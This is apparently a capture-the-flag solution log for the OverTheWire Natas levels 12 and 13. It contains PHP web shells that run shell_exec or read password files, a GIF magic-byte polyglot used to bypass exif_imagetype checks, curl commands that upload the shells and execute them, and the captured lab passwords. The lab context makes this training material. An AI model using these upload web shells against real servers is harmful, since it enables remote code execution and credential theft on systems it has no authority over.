@@ -1,0 +1,73 @@
+Natas Level 12: File Upload (No Validation)
+Vulnerability: Client controls the filename extension.
+Exploit:
+bash
+echo '<?php echo shell_exec("cat /etc/natas_webpass/natas13"); ?>' > shell.php
+
+curl -u natas12:PASSWORD \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas12.natas.labs.overthewire.org/
+Password: g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
+Natas Level 13: File Upload (Magic Bytes Bypass)
+Vulnerability: exif_imagetype() only checks file header, not content.
+Exploit: Create a polyglot file (valid image header + PHP code).
+bash
+printf 'GIF89a<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' > shell.php
+
+curl -u natas13:PASSWORD \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas13.natas.labs.overthewire.org/
+Password: A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+Key Difference
+Table
+Level 12	Level 13
+No file type check	Checks exif_imagetype()
+Upload any file	Must add magic bytes (GIF89a)
+Pure PHP shell	Polyglot file (image + PHP)
+──(white㉿white)-[~/white/gemini/otw]
+└─$ # Upload
+curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas13.natas.labs.overthewire.org/
+
+# Response: The file upload/mxtu50ijee.php has been uploaded
+
+# Execute
+curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     http://natas13.natas.labs.overthewire.org/upload/mxtu50ijee.php
+curl: (26) Failed to open/read local data from file/application
+GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/gemini/otw]
+└─$ printf 'GIF89a<?php $f=fopen("/etc/natas_webpass/natas14","r");echo fread($f,32);fclose($f); ?>' > shell.php
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/gemini/otw]
+└─$ # Upload, extract path, and fetch password in one go
+UPLOAD_URL=$(curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas13.natas.labs.overthewire.org/ | \
+     grep -o 'upload/[a-z0-9]*\.php')
+
+echo "Path: $UPLOAD_URL"
+
+curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     "http://natas13.natas.labs.overthewire.org/$UPLOAD_URL"
+Path: upload/2ik4cdqgwx.php
+upload/2ik4cdqgwx.php
+curl: (3) URL rejected: Malformed input to a URL function
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/gemini/otw]
+└─$ curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     http://natas13.natas.labs.overthewire.org/upload/2ik4cdqgwx.php
+GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8                                                                                                                                                                       
+┌──(white㉿white)-[~/white/gemini/otw]
+└─$ A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8: command not found
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/gemini/otw]
+└─$ cat shell.php                                     
+GIF89a<?php $f=fopen("/etc/natas_webpass/natas14","r");echo fread($f,32);fclose($f); ?>                                                                                                                                           
